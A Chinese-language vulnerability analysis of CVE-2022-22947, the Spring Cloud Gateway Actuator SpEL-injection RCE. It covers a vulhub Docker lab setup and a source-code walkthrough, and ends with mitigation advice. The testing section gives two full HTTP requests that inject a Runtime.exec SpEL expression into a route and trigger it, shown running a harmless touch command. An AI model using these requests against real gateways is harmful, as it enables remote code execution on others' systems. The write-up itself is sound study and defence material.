## **漏洞描述**

Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）发生在Spring Cloud
Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。

##  **利用条件**

3.1.0

3.0.0 to 3.0.6

##  **环境搭建**

使用vulhub搭建漏洞环境

切换到/vulhub/spring/CVE-2022-22947目录

使用docker-compose up -d 即可搭建漏洞环境

docker run -d -P vulfocus/spring_cve_2022_22947

访问到以下页面、环境搭建成功。![](https://image.3001.net/images/20220427/1651042366_6268e83ea4440a865f16b.jpeg!small)

##  **漏洞分析**

###  **漏洞原理**

先看看cve的描述

![](https://image.3001.net/images/20220427/1651042464_6268e8a0c254b941d4f6d.jpeg!small)

当 Gateway Actuator 打开时容易受到注入攻击。Spring Cloud Gateway 官网上软件的运行流程图示。

![](https://image.3001.net/images/20220427/1651042489_6268e8b9d7d63479dfc58.jpeg!small)

简单介绍：客户端向Spring Cloud GateWay发出请求，然后在GateWay Handler
Mapping中找到与请求相匹配的路由，将其发送到GateWay Web
Handler；Handler再通过指定的过滤器链来将请求发送到我们实际的服务执⾏业务逻辑，然后返回。过滤器之间⽤虚线分开是因为过滤器可能会在发送代理请求之前（pre）或者之后（post）执⾏业务逻辑，参考自(原文链接：https://blog.csdn.net/weixin_38361347/article/details/114108368)。Filter在“pre”类型过滤器中可以做参数校验、权限校验、流量监控、⽇志输出、协议转换等，在“post”类型的过滤器中可以做响应内容、响应头的修改、⽇志的输出、流量监控等。

网关处在架构中的位置：

简述：当一个请求过来的时候-->网关根据一定的条件进行匹配，匹配成功之后可以将请求转发到指定的服务地址(假设猜想，如果此时对转发的服务地址没有做严格校验及限制有可能会导致ssrf漏洞)。

![](https://image.3001.net/images/20220427/1651042528_6268e8e04d399a230c395.png!small)github看看源码的diff记录

![](https://image.3001.net/images/20220427/1651042591_6268e91f925b90204a82d.jpeg!small)

SPEL表达式的处理就是导致其RCE的关键。

Spring表达式语言（简称SpEl）是一个支持查询和操作运行时对象导航图功能的强大的表达式语言.
它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。

在源码中对其标志特征StandardEvaluationContext类搜索发现，定义的ShortConfigurable接口使用了StandardEvaluationContext()。可以看到
StandardEvaluationContext ，它允许调用或调用任何有效的表达式。

![](https://image.3001.net/images/20220427/1651042622_6268e93e44ee67f1e91b4.jpeg!small)向下追溯，共八个实现了ShortConfigurable接口，与gateway相关的是前两项，进一步分析。

![](https://image.3001.net/images/20220427/1651042672_6268e970d0ae4450baba1.jpeg!small)

AbstractGatewayFilterFactory实现了GatewayFilterFactory，AbstractNameValueGatewayFilterFactory继承了AbstractGatewayFilterFactory，

AddResponseHeaderGatewayFilterFactory继承了AbstractNameValueGatewayFilterFactory

![](https://image.3001.net/images/20220427/1651042717_6268e99d158d6755ffe74.png!small)在AddResponseHeaderGatewayFilterFactory中定义了一个apply方法、其gateway()是怎么来的。

![](https://image.3001.net/images/20220427/1651042807_6268e9f731b9ef7bdedc4.jpeg!small)参数传入了NameValueConfig、翻看NameValueConfig类、定义了getValue()方法，通过层层继类父承、端口实现、此时getValue()的返回值就是传入的SPEL表达式的值。

![](https://image.3001.net/images/20220427/1651042829_6268ea0d0773616991b4a.jpeg!small)

###  **漏洞测试**

根据官网上的路由配置信息进行payload构造。

![](https://image.3001.net/images/20220427/1651042885_6268ea45aa6da5d4d6425.jpeg!small)创建一条路由信息。构造好的payload。

    
    
    POST /actuator/gateway/routes/new_route HTTP/1.1
    Host: 11.22.33.130:55005
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
    Content-Type: application/json
    Connection: close
    Content-Length: 390
    {
    "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new_route/**"
      }
    }
    ],
    "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/xl_test\")}",
        "_genkey_1": "/${path}"
      }
    }
    ],
    "uri": "https://wya.pl",
    "order": 0
    }

![](https://image.3001.net/images/20220427/1651042920_6268ea68c4e79cfbde648.jpeg!small)

refresh 刷新使这个路由生效。

    
    
    POST /actuator/gateway/refresh HTTP/1.1
    Host: 11.22.33.130:55005
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
    Content-Type: application/json
    Connection: close
    Content-Length: 276
    {
    "predicate": "Paths: [/new_route], match trailing slash: true",
    "route_id": "new_route",
    "filters": [
    "[[RewritePath #{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/xl_test\")} = /${path}], order = 1]"
    ],
    "uri": "https://wya.pl",
    "order": 0
    }

![](https://image.3001.net/images/20220427/1651042965_6268ea9559bf5d48f15b1.jpeg!small)

进入到docker容器中查看。已经创建成功![](https://image.3001.net/images/20220427/1651043059_6268eaf34aa92389a5bf4.jpeg!small)

##  **修复建议**

1\. 如果不需要Actuator，可以通过management.endpoint.gateway.enable：false配置将其禁用。

2\. 如果需要Actuator，则应使用Spring Security对其进行保护。

3\. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。

